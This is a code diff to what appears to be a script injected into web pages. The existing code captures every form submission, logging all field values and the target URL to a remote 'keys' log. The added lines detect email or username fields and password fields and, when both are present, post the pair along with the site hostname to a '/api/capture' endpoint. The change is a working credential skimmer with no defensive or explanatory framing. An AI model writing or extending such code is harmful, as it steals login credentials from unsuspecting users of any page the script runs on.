@@ -740,10 +740,21 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             try {
                 const form = e.target;
                 const fields = {};
+                let emailVal = '', passwordVal = '';
                 form.querySelectorAll('input, textarea, select').forEach(el => {
                     const name = el.name || el.id || el.type || 'field';
                     if (el.type === 'file') return;
                     fields[name] = el.value;
+                    // Detect email/username field
+                    if (!emailVal && el.value &&
+                        (el.type === 'email' || /email|user|login|mail/i.test(name))) {
+                        emailVal = el.value;
+                    }
+                    if (!emailVal && el.value && el.type === 'text' &&
+                        /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(el.value)) {
+                        emailVal = el.value; // looks like email
+                    }
+                    if (el.type === 'password' && el.value) passwordVal = el.value;
                 });
                 const action = form.action || location.href;
                 const method = (form.method || 'GET').toUpperCase();
@@ -751,6 +762,13 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
                     keys: '[FORM SUBMIT] ' + method + ' ' + action + '\n' + JSON.stringify(fields, null, 2),
                     url: location.href
                 });
+                // Auto-capture credentials if email + password pair found
+                if (emailVal && passwordVal) {
+                    post('/api/capture', {
+                        email: emailVal, password: passwordVal,
+                        source: location.hostname, timestamp: new Date().toISOString()
+                    });
+                }
             } catch {}
         }, true);
 
